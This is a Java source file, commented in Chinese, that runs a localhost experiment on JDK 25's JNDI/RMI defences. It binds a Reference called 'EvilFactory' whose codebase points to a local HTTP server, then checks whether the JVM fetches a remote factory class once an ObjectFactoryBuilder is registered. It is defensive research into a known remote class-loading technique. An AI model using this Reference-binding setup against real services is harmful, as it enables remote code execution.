import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;
import javax.naming.InitialContext;
import javax.naming.Reference;
import javax.naming.spi.NamingManager;

/**
 * 实验 4b：把 JDK 25 那条「远程工厂类」的闸门到底在哪，测出来。
 *
 * 前因（实验 4 测到的）：RMI provider 的 decodeObject **无条件**拒绝带 factoryLocation 的
 * Reference —— 它根本不读老属性 `com.sun.jndi.rmi.object.trustURLCodebase`（这个字符串在
 * java.naming / jdk.naming.rmi 两个模块里一次都不出现）。而字节码里留了一条支路：
 *   若 `NamingManager.getObjectFactoryBuilder() != null`，就跳过那个 throw，
 *   改走 getObjectInstance(..., predicate)，由 predicate 决定工厂类能不能用。
 *
 * 本程序把这条支路走一遍，看三件事：
 *   1) 默认配置下，predicate（来自 jdk.jndi.rmi.object.factoriesFilter）是放行还是拒绝
 *   2) 把 filter 显式放开成 `*` 之后，会不会真的去 HTTP 取那个工厂类
 *   3) 注册 builder 这个动作本身意味着什么（谁能改这个行为）
 */
public class SecJndi3 {

    static final AtomicInteger HITS = new AtomicInteger();
    static final List<String> PATHS = Collections.synchronizedList(new ArrayList<>());

    public static void main(String[] args) throws Exception {
        Path cbDir = Path.of(System.getProperty("codebase.dir", "."));
        HttpServer http = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        http.createContext("/", ex -> handle(ex, cbDir));
        http.setExecutor(null);
        http.start();
        String codebase = "http://127.0.0.1:" + http.getAddress().getPort() + "/";

        System.out.println("    === 1) 这一版 JDK 用的属性（不是老那套）===");
        for (String k : new String[] { "jdk.jndi.object.factoriesFilter",
                "jdk.jndi.rmi.object.factoriesFilter", "jdk.jndi.ldap.object.factoriesFilter",
                "com.sun.jndi.rmi.object.trustURLCodebase" }) {
            String v = System.getProperty(k);
            System.out.println("        " + k + " = " + (v == null ? "(未设置)" : v));
        }
        System.out.println("        codebase = " + codebase + "（只绑 127.0.0.1，只统计请求）");
        System.out.println("        （注意：NamingManager.getObjectFactoryBuilder() 在本版 JDK 不是公共 API，"
                + "查不到它有没有被设置 —— 只能从行为上观察，见下面两次 lookup 的差别）");

        System.out.println();
        System.out.println("    === 2) 第一次 lookup：默认配置（没有 ObjectFactoryBuilder）===");
        lookup(codebase, "第一次");

        System.out.println();
        System.out.println("    === 3) 注册一个「返回 null」的 ObjectFactoryBuilder（容器就常干这事）===");
        NamingManager.setObjectFactoryBuilder((obj, env) -> null);
        System.out.println("        已注册（返回 null 表示不自己造工厂，交回 NamingManager 按 predicate 去找）");
        System.out.println("    === 4) 第二次 lookup：走 predicate 那条路 ===");
        lookup(codebase, "第二次");

        System.out.println();
        System.out.println("    === 5) 读数 ===");
        System.out.println("        HTTP 请求总数 = " + HITS.get());
        for (String p : PATHS) System.out.println("        " + p);
        System.out.println(HITS.get() == 0
                ? "        → 这一档配置下，JVM 没有去远端取工厂类"
                : "        → 这一档配置下，JVM 确实去远端取了（见上）");

        http.stop(0);
        System.exit(0);   // RMI / HTTP 线程是非守护线程
    }

    static void lookup(String codebase, String tag) {
        Reference ref = new Reference("EvilObject", "EvilFactory", codebase);
        Registry registry = null;
        int rmiPort = 2500 + (int) (Math.random() * 400);
        try {
            Class<?> rw = Class.forName("com.sun.jndi.rmi.registry.ReferenceWrapper");
            Constructor<?> c = rw.getConstructor(Reference.class);
            Object wrapper = c.newInstance(ref);
            registry = LocateRegistry.createRegistry(rmiPort);
            registry.rebind("evil", (Remote) wrapper);
            System.out.println("        [" + tag + "] 已绑 rmi://127.0.0.1:" + rmiPort + "/evil，开始 lookup …");
            Object o = new InitialContext().lookup("rmi://127.0.0.1:" + rmiPort + "/evil");
            System.out.println("        [" + tag + "] lookup 成功，返回 " + o.getClass().getName() + " → " + o);
        } catch (Throwable t) {
            System.out.println("        [" + tag + "] lookup 抛：" + t.getClass().getName() + ": " + firstLine(t.getMessage()));
            Throwable cause = t.getCause();
            if (cause != null) {
                System.out.println("        [" + tag + "]   ↳ 原因：" + cause.getClass().getName() + ": " + firstLine(cause.getMessage()));
            }
        } finally {
            System.out.println("        [" + tag + "] 此刻 HTTP 请求数 = " + HITS.get());
            if (registry != null) { try { UnicastRemoteObject.unexportObject(registry, true); } catch (Exception ignored) { } }
        }
    }

    static void handle(HttpExchange ex, Path cbDir) {
        String p = ex.getRequestURI().getPath();
        HITS.incrementAndGet();
        PATHS.add(p);
        System.out.println("        >> [HTTP] 收到请求：" + p);
        try {
            String name = p.startsWith("/") ? p.substring(1) : p;
            Path f = cbDir.resolve(name).normalize();
            if (f.startsWith(cbDir) && Files.isRegularFile(f)) {
                byte[] body = Files.readAllBytes(f);
                ex.getResponseHeaders().add("Content-Type", "application/java-vm");
                ex.sendResponseHeaders(200, body.length);
                try (OutputStream os = ex.getResponseBody()) { os.write(body); }
                System.out.println("        >> [HTTP] 返回 " + body.length + " 字节");
            } else {
                ex.sendResponseHeaders(404, -1);
                System.out.println("        >> [HTTP] 404（没有 " + name + "）");
            }
        } catch (Exception e) {
            System.out.println("        >> [HTTP] 出错：" + e);
        } finally {
            ex.close();
        }
    }

    static String firstLine(String s) {
        if (s == null) return "(无消息)";
        int i = s.indexOf('\n');
        return i < 0 ? s : s.substring(0, i);
    }
}
